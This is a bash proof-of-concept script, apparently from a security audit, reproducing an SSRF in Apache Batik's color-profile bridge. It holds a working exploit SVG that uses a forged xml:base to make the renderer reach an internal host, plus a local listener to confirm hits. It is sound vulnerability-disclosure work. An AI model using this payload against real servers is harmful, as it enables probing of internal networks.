#!/usr/bin/env bash
# F-2 — SSRF via xml:base-forged origin in SVGColorProfileElementBridge.
# The bridge derives the same-host check's "document URL" from profile.getBaseURI() (attacker-controlled
# via xml:base) instead of the true document URL, so the attacker controls both sides of the comparison.
# Works even with a NULL document URL (raw-string transcode). Blind SSRF (response consumed as ICC),
# so it is an internal host/port oracle. Severity: Medium; deployment-dependent High.
set -uo pipefail
LAB="${BATIK_LAB_DIR:-/tmp/batik-lab}"; cd "$LAB"
CP="$(printf '%s' "$LAB/batik-1.19/lib/*"):$LAB"

cat > f2.svg <<'SVG'
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="20" height="20">
  <color-profile name="p" xlink:href="profile.icc" xml:base="http://127.0.0.1:9999/"/>
  <rect width="20" height="20" fill="rgb(255,0,0) icc-color(p,1,0,0)"/></svg>
SVG
cat > f2srv.py <<'PY'
import http.server, socketserver, threading, time
HIT={"n":0}
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self): HIT["n"]+=1; print("PROFILE_HIT %s"%self.path,flush=True); self.send_response(404); self.end_headers()
    def log_message(self,*a): pass
socketserver.TCPServer.allow_reuse_address=True
threading.Thread(target=lambda:socketserver.TCPServer(("127.0.0.1",9999),H).serve_forever(),daemon=True).start()
time.sleep(18); print("HITS=%d"%HIT["n"],flush=True)
PY
python3 f2srv.py > f2.log 2>&1 & SRV=$!; sleep 1
echo "== doc host = 198.51.100.9 (attacker host, != 127.0.0.1) ; xml:base forges 127.0.0.1:9999 =="
java -cp "$CP" BatikProbe "$LAB/f2.svg" "http://198.51.100.9/evil.svg" >/dev/null 2>&1
echo "== NULL document URL (raw-string transcode) =="
java -cp "$CP" BatikProbe "$LAB/f2.svg" "-" >/dev/null 2>&1
sleep 2
echo "== server log =="; grep -c PROFILE_HIT f2.log | xargs echo "internal hits (should be >=1 despite doc host != 127.0.0.1):"
kill $SRV 2>/dev/null
echo "EXPECT: PROFILE_HIT on 127.0.0.1:9999 even though the doc host is 198.51.100.9 (and with null doc URL)."
